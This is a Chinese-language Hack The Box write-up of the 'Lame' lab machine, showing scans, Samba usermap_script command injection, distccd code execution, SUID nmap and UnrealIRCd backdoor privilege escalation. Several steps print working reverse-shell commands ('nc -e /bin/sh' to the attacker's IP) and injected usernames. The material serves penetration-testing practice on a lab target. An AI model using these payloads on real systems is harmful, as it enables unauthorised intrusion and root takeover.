# HTB靶机 Lame WriteUp


&lt;!--more--&gt;

# Lame

![图片](/resource/HTB靶机-Lame-WriteUp.assets/640-20230220174730154.png)

简介：

&gt; Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement

Tags：

&gt; Injection,  CMS Exploit,  Linux,  Web,  PHP,  Password Reuse

Rating: 4.4

Skills：

- Linux基础
- 枚举端口和服务
- 识别有漏洞的服务
- 利用Samba漏洞

## Pentest

## 0.SCAN

扫下IP：

```shell
 $ sudo nmap -sSV -T4  10.10.10.3 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:43 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.24s latency).
 Not shown: 996 filtered tcp ports (no-response)
 PORT   STATE SERVICE     VERSION
 21/tcp open ftp         vsftpd 2.3.4
 22/tcp open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 1.ftp

```shell
 $ sudo nmap -T4 -sC -p21 10.10.10.3         
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 14:47 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.24s latency).
 
 PORT   STATE SERVICE
 21/tcp open ftp
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
 |     Connected to 10.10.14.2
 |     Logged in as ftp
 |     TYPE: ASCII
 |     No session bandwidth limit
 |     Session timeout in seconds is 300
 |     Control connection is plain text
 |     Data connections will be plain text
 |     vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
```

匿名登录ftp查看一下

```shell
 $ ftp 10.10.10.3 
 Connected to 10.10.10.3.
 220 (vsFTPd 2.3.4)
 Name (10.10.10.3:xavier): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp&gt; ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 226 Directory send OK.
 ftp&gt; pwd
 257 &#34;/&#34;
 ftp&gt; bye
 421 Timeout.
```

尝试vsftp对应的漏洞

```shell
 $ locate *.nse | grep vsftp
 /usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
 $ sudo nmap --script ftp-vsftpd-backdoor.nse -p21 10.10.10.3 -T4 -sSV   
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 15:50 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.24s latency).
 
 PORT   STATE SERVICE VERSION
 21/tcp open ftp     vsftpd 2.3.4
 Service Info: OS: Unix
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.22 seconds
```

该漏洞不存在，转向ssh和smb

## 2.ssh

试着爆破一下，没发现可以利用的点。

## 3.SMB

### MSF

```shell
 msf6 &gt; search samba
 msf6 &gt; use exploit/multi/samba/usermap_script
 [*] No payload configured, defaulting to cmd/unix/reverse_netcat
 msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3
 rhosts =&gt; 10.10.10.3
 msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.2
 lhost =&gt; 10.10.14.2
 msf6 exploit(multi/samba/usermap_script) &gt; run
 
 [*] Started reverse TCP handler on 10.10.14.2:4444 
 [*] Command shell session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.3:32875 ) at 2022-03-16 16:04:23 &#43;0800
 
 whoami
 root
 find / -name &#34;user.txt&#34;
 /home/makis/user.txt
 cat /home/makis/user.txt
 83bb7c7fff163562d48ac4ba14316025
 cat /root/root.txt
 848a15387ca22dcf38b1cdc8538223a0
```

不用MSF怎么解决呢？



试试nmap的nse漏洞脚本，无果

```shell
 $ sudo nmap --script smb-vuln* -p139,445 10.10.10.3 -T4
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 16:38 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.24s latency).
 
 PORT   STATE SERVICE
 139/tcp open netbios-ssn
 445/tcp open microsoft-ds
 
 Host script results:
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: false
 |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
 
 Nmap done: 1 IP address (1 host up) scanned in 175.81 seconds
```



### 非MSF

信息搜集，寻找历史漏洞

确定Samba具体版本

```shell
 $ smbclient -L 10.10.10.3
 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
                                                                                                                                                  
 ┌──(xavier㉿xavier)-[~]
 └─$ smbclient -L 10.10.10.3 -U &#34;&#34; -N --option=&#39;client min protocol=nt1&#39;
 
        Sharename       Type     Comment
         ---------       ----      -------
        print$         Disk     Printer Drivers
        tmp             Disk     oh noes!
        opt             Disk      
        IPC$           IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$         IPC       IPC Service (lame server (Samba 3.0.20-Debian))
 Reconnecting with SMB1 for workgroup listing.
 
        Server               Comment
         ---------            -------
 
        Workgroup           Master
         ---------            -------
        WORKGROUP           LAME
```

关于smbclient出现NT_STATUS_CONNECTION_DISCONNECTED错误

smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协商,解决办法如上，通过option指定，也可以修改配置文件 `/etc/samba/smb.conf`



**crackmapexec 探测**

```shell
 $ crackmapexec smb --shares 10.10.10.3 -u &#39;&#39; -p &#39;&#39;                
 [*] First time use detected                                        
 [*] Creating home directory structure                               
 [*] Creating default workspace                                      
 [*] Initializing MSSQL protocol database                            
 [*] Initializing SMB protocol database                              
 [*] Initializing LDAP protocol database                           
 [*] Initializing WINRM protocol database                            
 [*] Initializing SSH protocol database                              
 [*] Copying default configuration file                              
 [*] Generating SSL certificate                                     
 SMB         10.10.10.3      445   LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)                     
 SMB         10.10.10.3      445   LAME             [&#43;] hackthebox.gr\:  
 SMB         10.10.10.3      445   LAME             [&#43;] Enumerated shares 
 SMB         10.10.10.3      445   LAME             Share           Permissions     Remark                                                       
 SMB         10.10.10.3      445   LAME             -----           -----------     ------                                                       
 SMB         10.10.10.3      445   LAME             print$                         Printer Drivers                                              
 SMB         10.10.10.3      445   LAME             tmp             READ,WRITE     oh noes!                                                     
 SMB         10.10.10.3      445   LAME             opt           
 SMB         10.10.10.3      445   LAME             IPC$                           IPC Service (lame server (Samba 3.0.20-Debian))              
 SMB         10.10.10.3      445   LAME             ADMIN$                         IPC Service (lame server (Samba 3.0.20-Debian))
```



确定Samba 版本为 3.0.20，就可以找相应的漏洞。

```shell
$ searchsploit samba 3.0.20
 $ searchsploit samba 3.0.20
 -------------------------------------------------------------------------------------------------------------------------
  Exploit Title                                                                         | Path                           
 -------------------------------------------------------------------------------------------------------------------------
 Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                 | multiple/remote/10095.txt
 Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)       | unix/remote/16320.rb
 Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
 Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
 Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                           | linux_x86/dos/36741.py
 -------------------------------------------------------------------------------------------------------------------------
 Shellcodes: No Results
 
 $ more /usr/share/exploitdb/exploits/unix/remote/16320.rb
 ......
                         &#39;Author&#39;         =&gt; [ &#39;jduck&#39; ],
                         &#39;License&#39;        =&gt; MSF_LICENSE,
                         &#39;Version&#39;        =&gt; &#39;$Revision: 10040 $&#39;,
                         &#39;References&#39;     =&gt;
                                [ 
                                        [ &#39;CVE&#39;, &#39;2007-2447&#39; ],
                                        [ &#39;OSVDB&#39;, &#39;34700&#39; ],
                                        [ &#39;BID&#39;, &#39;23972&#39; ],
                                        [ &#39;URL&#39;, &#39;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534&#39; ],
                                        [ &#39;URL&#39;, &#39;http://samba.org/samba/security/CVE-2007-2447.html&#39; ]
                                ],
                         &#39;Platform&#39;       =&gt; [&#39;unix&#39;],
 
```

看到CVE编号：2007-2447

### Github

Github找利用脚本

随便找了一个，https://github.com/amriunix/CVE-2007-2447，安装依赖`$ pip install pysmb`，按照说明运行：

```shell
 $ python3 usermap_script.py 
 [*] CVE-2007-2447 - Samba usermap script
 [-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
 
 $ nc -l -v -p 4444 
 
 $ python3 usermap_script.py 10.10.10.3 139 10.10.14.2 4444
 [*] CVE-2007-2447 - Samba usermap script
 [&#43;] Connecting !
 [&#43;] Payload was sent - check netcat !
 
 $ nc -l -v -p 4444   
 listening on [any] 4444 ...
 10.10.10.3: inverse host lookup failed: Unknown host
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 36956
 whoami
 root
 whereis python
 python: /usr/bin/python2.5-config /usr/bin/python /usr/bin/python2.5 /etc/python /etc/python2.5 /usr/lib/python2.3 /usr/lib/python2.5 /usr/lib/python2.4 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz
 python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
 root@lame:/# find / -name user.txt
 find / -name user.txt
 /home/makis/user.txt
 root@lame:/# cat /home/makis/user.txt
 cat /home/makis/user.txt
 83bb7c7fff163562d48ac4ba14316025
 root@lame:/# cat /root/root.txt
 cat /root/root.txt
 848a15387ca22dcf38b1cdc8538223a0
 root@lame:/#
```

### crackmapexec

来自参考文献2

`more /usr/share/exploitdb/exploits/unix/remote/16320.rb` 分析漏洞利用脚本，发现name 字段为

```ruby
 &#34;/=`nohup &#34; &#43; payload.encoded &#43; &#34;`&#34;
```



```shell
 $ crackmapexec smb --shares 10.10.10.3 -u &#39;./=`nohup nc -e /bin/sh 10.10.14.2 4445`&#39; -p &#39;&#39;                                           
 SMB         10.10.10.3     445   LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
```

另一边做监听`$ nc -lvnp 4445`

```shell
 $ nc -lvnp 4445
 listening on [any] 4445 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 59300
 whoami
 root
```

Metasploit 使用 nohup 命令，即 no hang up的缩写，这是 Linux 系统中的一个命令，即使在退出 shell 或终端并在当前上下文之外启动进程然后是有效负载之后，它也能保持进程运行。

总结：Lame 是利用Samba的命令注入漏洞直接获取root权限

## 4. distccd

看了参考文献2后，才发现还少了一个点没有发现，这边我不写了，直接看原文吧。

------

想了想还是再从这个点再做一次，多练习练习。

nmap 默认扫描未发现该端口，需要进行全端口才可以。这里用masscan快速扫描

```shell
 $ sudo masscan -e tun0 -p- --max-rate 500 10.10.10.3
 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-17 05:45:11 GMT
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65535 ports/host]
 Discovered open port 139/tcp on 10.10.10.3 
 Discovered open port 22/tcp on 10.10.10.3  
 Discovered open port 445/tcp on 10.10.10.3 
 Discovered open port 3632/tcp on 10.10.10.3 
 Discovered open port 21/tcp on 10.10.10.3
```

nmap 做细分扫描，扫特定端口的服务详情，并用上NSE

```shell
 $ sudo nmap -T4 -sSV -sC -p3632 10.10.10.3          
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:52 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.29s latency).
 
 PORT     STATE SERVICE VERSION
 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.28 seconds
 
 $ locate *.nse | grep distcc
 /usr/share/nmap/scripts/distcc-cve2004-2687.nse
 
 $ sudo nmap -T4 --script distcc* -p3632 10.10.10.3                
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-17 13:57 HKT
 Nmap scan report for 10.10.10.3
 Host is up (0.24s latency).
 
 PORT     STATE SERVICE
 3632/tcp open distccd
 | distcc-cve2004-2687: 
 |   VULNERABLE:
 |   distcc Daemon Command Execution
 |     State: VULNERABLE (Exploitable)
 |     IDs: CVE:CVE-2004-2687
 |     Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
 |       Allows executing of arbitrary commands on systems running distccd 3.1 and
 |       earlier. The vulnerability is the consequence of weak service configuration.
 |       
 |     Disclosure date: 2002-02-01
 |     Extra information:
 |       
 |     uid=1(daemon) gid=1(daemon) groups=1(daemon)
 |   
 |     References:
 |       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
 |_     https://distcc.github.io/security.html
 
 Nmap done: 1 IP address (1 host up) scanned in 2.88 seconds
```

网上查distccd的资料：

&gt; *distccd* is the server for the ***distcc**(1)* distributed compiler. It accepts and runs compilation jobs for network clients.

`more /usr/share/nmap/scripts/distcc-cve2004-2687.nse`查看NSE脚本的具体内容：

```shell
 $ more /usr/share/nmap/scripts/distcc-cve2004-2687.nse
 .....
 description = [[
 Detects and exploits a remote code execution vulnerability in the distributed
 compiler daemon distcc. The vulnerability was disclosed in 2002, but is still
 present in modern implementation due to poor configuration of the service.
 ]]
 
 ---
 -- @usage
 -- nmap -p 3632 &lt;ip&gt; --script distcc-exec --script-args=&#34;distcc-exec.cmd=&#39;id&#39;&#34;
 ...
```

可以看到`distcc-exec.cmd`参数即为所执行的命令，将其改为连接命令，如`nc -e /bin/bash 10.10.14.2 4444`，

用`nmap -p 3632 &lt;ip&gt; --script distcc-exec --script-args=&#34;distcc-exec.cmd=&#39;id&#39;&#34;`这种方法出现了很多意料之外的问题，无法成功获得shell。排查中...

```shell
 NSE: failed to initialize the script engine: 
 /usr/bin/../share/nmap/nse_main.lua:822: &#39;distcc-exec&#39; did not match a category, filename, or directory
 stack traceback:
        [C]: in function &#39;error&#39;
        /usr/bin/../share/nmap/nse_main.lua:822: in local &#39;get_chosen_scripts&#39;         
        /usr/bin/../share/nmap/nse_main.lua:1322: in main chunk 
        [C]: in ?                                                           
         
 QUITTING!        
```

排查结果出来了，虽然用法中写着distcc-exec，但nmap其实并无法识别，只能用全名，对应的后面也需要修改。改成如下后，可成功执行

```shell
 $ sudo nmap -p3632 10.10.10.3 --script=distcc-cve2004-2687.nse --script-args=&#34;distcc-cve2004-2687.cmd=&#39;nc -e /bin/bash 10.10.14.2 4444&#39;&#34;
 
 $ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558
 
```

![图片](/resource/HTB靶机-Lame-WriteUp.assets/640-20230220174729769.png)

成功获得了daemon 权限，接下去进行提权

### 提权1：SUID - nmap

```shell
 └─$ nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558
 whoami
 daemon
 python -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;    
 daemon@lame:/tmp$ find / -type f -perm -u=s 2&gt;/dev/null
 find / -type f -perm -u=s 2&gt;/dev/null
 /bin/umount
 /bin/fusermount
 /bin/su
 /bin/mount
 /bin/ping
 /bin/ping6
 /sbin/mount.nfs
 /lib/dhcp3-client/call-dhclient-script
 /usr/bin/sudoedit
 /usr/bin/X
 /usr/bin/netkit-rsh
 /usr/bin/gpasswd
 /usr/bin/traceroute6.iputils
 /usr/bin/sudo
 /usr/bin/netkit-rlogin
 /usr/bin/arping
 /usr/bin/at
 /usr/bin/newgrp
 /usr/bin/chfn
 /usr/bin/nmap
 /usr/bin/chsh
 /usr/bin/netkit-rcp
 /usr/bin/passwd
 /usr/bin/mtr
 /usr/sbin/uuidd
 /usr/sbin/pppd
 /usr/lib/telnetlogin
 /usr/lib/apache2/suexec
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
 /usr/lib/pt_chown
 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
 daemon@lame:/tmp$ nmap --version
 nmap --version
 Nmap version 4.53 ( http://insecure.org )
```

发现有nmap，版本为4.53，可以利用进行提权

&gt; nmap 在 2.02 到 5.21 版本中可用交互模式（--interactive）执行 shell 命令
&gt;
&gt; The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.

```
 daemon@lame:/tmp$ nmap --interactive
 nmap --interactive
 
 Starting Nmap V. 4.53 ( http://insecure.org )
 Welcome to Interactive Mode -- press h &lt;enter&gt; for help
 nmap&gt; !sh
 !sh
 sh-3.2# whoami
 whoami
 root
 sh-3.2# cat /root/root.txt
 cat /root/root.txt
 29ad7975c49f5ccb49b735a93efbfc4e
```

### 提权2：ssh key

```shell
 daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
 cat /root/.ssh/authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh&#43;WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U&#43;qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE&#43;kcP&#43;Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc&#43;Wv8Vw7bwkf&#43;1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
```

看到msfadmin@metasploitable，最初以为是其他攻击方式留下的，重置主机后发现还是存在，说明是个线索，但是我不知道是什么。参考文章2告诉我是 `CVE-2008-0166` 的线索，没了解过，`$ searchsploit cve-2008-0166` 无过，上网搜。

&gt; OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.
&gt;
&gt; ——https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166
&gt;
&gt; 翻译：基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击。

expdb搜索：https://www.exploit-db.com/search?cve=2008-0166

看了一个利用脚本，描述步骤如下：

```shell
 # https://www.exploit-db.com/exploits/5720
 # Autor: hitz - WarCat team (warcat.no-ip.org)
 # Collaborator: pretoriano
 #
 # 1. Download https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2 (debian_ssh_rsa_2048_x86.tar.bz2)
 #
 # 2. Extract it to a directory
 #
 # 3. Execute the python script
 #     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
 #     - execute: python exploit.py (without parameters) to display the help
 #     - if the key is found, the script shows something like that:
 #         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
 # Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
 ############################################################################
```

因为网络问题没法下载5622.tar.bz2，这边先略过，可见参考文章2：privesc2部分

### 提权3 : UnrealIRCd Backdoored

推测由于网络问题，`netstat -nltp` 数据没能回显过来，从结果中发现6697端口，马上想到 IRC。

`ps auxww | grep -i unreal` 查看unrealIRC进程，发现 `UnrealIRCd` 以root权限运行。

```shell
 ps auxww | grep -i unreal
 root     5612 0.0 0.4   8540 2488 ?       S   01:43   0:00 /usr/bin/unrealircd
 root     6522 0.0 0.1   1784   548 ?       R   06:01   0:00 grep -i unreal
```

根据这篇文章 unrealircd-3281-backdoored ，我们可以利用此服务来创建后门并拿到root权限	

按照参考文章2，做一遍

```shell
 aemon@lame:/tmp$ nc 127.0.0.1 6697
 nc 127.0.0.1 6697
 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
 :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead
 ERROR :Closing Link: [127.0.0.1] (Ping timeout)
```

得到 Metasploitable 的输出，这表明我们在正确的方向。为了方便使用后门，我们可以使用已知的connect-back shell方法。

```shell
 daemon@lame:/tmp$ echo &#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34; | nc 127.0.0.1 6697         
 echo &#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34; | nc 127.0.0.1 6697
 :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
 :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead
```

另一边

```shell
 └─$ nc -lvnp 5555   
 listening on [any] 5555 ...
 connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 39370
 whoami
 root
 cat /root/root.txt
 29ad7975c49f5ccb49b735a93efbfc4e
```

测试发现IRC的6667和6697端口都可以。

## 他山之石

- https://hackpentest.in/hackthebox-lame/  使用了python获取一个完整的tty SHELL `python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;`，同时提供了非MSF思路。
- https://coldfusionx.github.io/posts/LameHTB/  使用了crackmapexec ， 根据现有exp自己复现了利用代码；distccd的攻击思路、提权思路



---

> 作者: Xavier  
> URL: http://localhost:1313/posts/hackthebox-lame/  

